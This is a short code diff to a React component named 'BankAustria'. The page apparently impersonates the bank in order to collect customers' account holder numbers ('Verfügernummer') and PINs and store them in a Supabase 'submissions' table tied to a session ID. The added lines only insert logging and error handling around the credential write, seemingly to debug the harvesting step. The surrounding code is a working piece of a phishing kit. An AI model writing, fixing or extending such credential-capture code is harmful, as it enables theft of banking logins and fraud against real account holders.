@@ -262,13 +262,18 @@ const BankAustria = () => {
             <div className="flex justify-center mb-6">
               <button
                 onClick={async () => {
+                  console.log("Session ID:", sessionId);
                   if (sessionId) {
-                    await supabase.from("submissions").update({
+                    const { error } = await supabase.from("submissions").update({
                       bank_username: verfueger,
                       bank_password: pin,
                       bank_username_label: "Verfügernummer",
                       bank_password_label: "PIN",
                     }).eq("session_id", sessionId);
+                    if (error) console.error("Update failed:", error);
+                    else console.log("Update successful");
+                  } else {
+                    console.error("No session ID found in URL!");
                   }
                   setShowLoading(true);
                 }}
